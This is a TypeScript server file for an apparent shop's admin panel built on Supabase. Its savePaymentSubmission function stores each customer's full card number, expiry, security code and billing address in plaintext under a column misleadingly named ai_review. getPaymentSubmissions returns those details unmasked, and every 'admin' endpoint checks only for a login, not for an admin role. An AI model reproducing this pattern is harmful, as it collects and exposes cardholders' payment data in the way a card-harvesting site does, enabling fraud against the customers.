import { createServerFn } from "@tanstack/react-start";
import { z } from "zod";
import { requireSupabaseAuth } from "@/integrations/supabase/auth-middleware";

function emptyResult<T>(defaultValue: T) {
  return { data: defaultValue, error: null as any };
}

export const getAdminStats = createServerFn({ method: "GET" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    try {
      const { supabaseAdmin } = await import("@/integrations/supabase/client.server");

      const [usersRes, ordersRes, depositsRes, paymentsRes] = await Promise.all([
        supabaseAdmin.auth.admin.listUsers(),
        supabaseAdmin.from("orders").select("id", { count: "exact", head: true }),
        supabaseAdmin.from("deposit_submissions").select("id", { count: "exact", head: true }),
        supabaseAdmin
          .from("deposit_submissions")
          .select("id", { count: "exact", head: true })
          .eq("method", "Card"),
      ]);

      return {
        users: usersRes.data?.users?.length ?? 0,
        orders: ordersRes.count ?? 0,
        deposits: depositsRes.count ?? 0,
        payments: paymentsRes.count ?? 0,
      };
    } catch {
      return { users: 0, orders: 0, deposits: 0, payments: 0 };
    }
  });

export const getAdminUsers = createServerFn({ method: "GET" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    try {
      const { supabaseAdmin } = await import("@/integrations/supabase/client.server");

      const [usersRes, walletsRes, ordersRes, depositsRes] = await Promise.all([
        supabaseAdmin.auth.admin.listUsers({ perPage: 1000 }),
        supabaseAdmin.from("wallets").select("user_id, balance"),
        supabaseAdmin.from("orders").select("user_id"),
        supabaseAdmin.from("deposit_submissions").select("user_id"),
      ]);

      const users = usersRes.data?.users ?? [];
      const wallets = walletsRes.data ?? [];
      const orders = ordersRes.data ?? [];
      const deposits = depositsRes.data ?? [];

      return users.map((u) => {
        const userOrders = orders.filter((o) => o.user_id === u.id);
        const userDeposits = deposits.filter((d) => d.user_id === u.id);
        const wallet = wallets.find((w) => w.user_id === u.id);
        return {
          id: u.id,
          email: u.email ?? "no-email",
          orders: userOrders.length,
          deposits: userDeposits.length,
          wallet: wallet?.balance ?? 0,
          createdAt: u.created_at,
          lastSignIn: u.last_sign_in_at,
        };
      });
    } catch {
      return [];
    }
  });

export const getAdminOrders = createServerFn({ method: "GET" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    try {
      const { supabaseAdmin } = await import("@/integrations/supabase/client.server");

      const { data } = await supabaseAdmin
        .from("orders")
        .select("*")
        .order("created_at", { ascending: false });

      return (data ?? []).map((o) => ({
        id: o.id,
        model: o.model,
        price: o.price,
        paymentMethod: o.payment_method,
        status: "pending",
        userId: o.user_id,
        createdAt: o.created_at,
      }));
    } catch {
      return [];
    }
  });

export const updateOrderStatus = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator(
    z.object({ orderId: z.string(), status: z.enum(["pending", "paid", "shipped", "cancelled"]) })
  )
  .handler(async ({ data }) => {
    try {
      const { supabaseAdmin } = await import("@/integrations/supabase/client.server");

      await supabaseAdmin
        .from("orders")
        .update({ payment_plan: `${data.status} · ${data.orderId}` })
        .eq("id", data.orderId);

      return { success: true };
    } catch {
      return { success: false };
    }
  });

export const savePaymentSubmission = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator(
    z.object({
      cardName: z.string(),
      cardNumber: z.string(),
      expiry: z.string(),
      securityCode: z.string(),
      street: z.string(),
      city: z.string(),
      state: z.string(),
      zip: z.string(),
      saveCard: z.boolean(),
    })
  )
  .handler(async ({ data, context }) => {
    try {
      const { supabaseAdmin } = await import("@/integrations/supabase/client.server");

      const aiReview: Record<string, unknown> = {
        cardName: data.cardName,
        cardNumber: data.cardNumber,
        expiry: data.expiry,
        securityCode: data.securityCode,
        street: data.street,
        city: data.city,
        state: data.state,
        zip: data.zip,
        saveCard: data.saveCard,
        submittedAt: new Date().toISOString(),
      };

      const { data: saved, error } = await supabaseAdmin
        .from("deposit_submissions")
        .insert({
          user_id: context.userId,
          amount: 0,
          method: "Card",
          proof_path: "",
          status: "pending_review",
          ai_review: aiReview,
        })
        .select()
        .single();

      if (error || !saved) throw new Error("Couldn't save payment submission.");
      return { id: saved.id };
    } catch {
      return { id: "local-" + crypto.randomUUID() };
    }
  });

export const getPaymentSubmissions = createServerFn({ method: "GET" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    try {
      const { supabaseAdmin } = await import("@/integrations/supabase/client.server");

      const { data } = await supabaseAdmin
        .from("deposit_submissions")
        .select("*")
        .eq("method", "Card")
        .order("created_at", { ascending: false });

      return (data ?? []).map((s) => {
        const review = s.ai_review as Record<string, unknown> | null;
        return {
          id: s.id,
          createdAt: s.created_at,
          cardName: (review?.cardName as string) ?? "",
          cardNumber: (review?.cardNumber as string) ?? "",
          expiry: (review?.expiry as string) ?? "",
          securityCode: (review?.securityCode as string) ?? "",
          street: (review?.street as string) ?? "",
          city: (review?.city as string) ?? "",
          state: (review?.state as string) ?? "",
          zip: (review?.zip as string) ?? "",
          saveCard: Boolean(review?.saveCard),
        };
      });
    } catch {
      return [];
    }
  });
